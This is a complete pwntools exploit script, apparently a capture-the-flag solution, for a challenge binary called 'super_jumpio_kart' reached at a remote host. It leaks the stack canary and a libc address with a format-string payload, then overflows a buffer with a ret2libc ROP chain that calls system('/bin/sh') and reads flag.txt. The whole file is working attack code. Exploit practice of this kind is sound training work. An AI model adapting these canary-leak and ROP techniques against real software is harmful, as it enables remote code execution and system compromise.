from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./super_jumpio_kart"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("83.136.253.59", 44488)


def ddebug(b=""):
    if not f_gdb:
        return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))


io.sendlineafter(">", "4")
io.sendlineafter("Enter name for your Power Up:", "--%13$p--%19$p--")

io.recvuntil("--", drop=True)
canary = int(io.recvuntil("--", drop=True), 16)
log.success("canary:-----> " + hex(canary))

leak = int(io.recvuntil("--", drop=True), 16)
libc.address = leak - 0x2a1ca
log.success("libc:-----> " + hex(libc.address))

for i in range(0x7):
    io.sendlineafter("turn ahead: ", "R")

ddebug("breakrva 0x0189c\n continue")
io.sendlineafter("use your Power Up?? (y/n)\n\n> ", "y")

"""
0x000000000010f75b : pop rdi ; ret
0x000000000002882f : ret
"""
pop_rdi = 0x000000000010f75b
ret = 0x000000000002882f
payload = b"a"*0x48
payload += p64(canary)
payload += p64(0)*2
payload += p64(0)
payload += p64(ret+libc.address)
payload += p64(pop_rdi+libc.address)
payload += p64(next(libc.search("/bin/sh")))
payload += p64(libc.symbols["system"])

io.sendlineafter("things about your victory: ", payload)
io.sendline(b"cat flag.txt")

io.interactive()
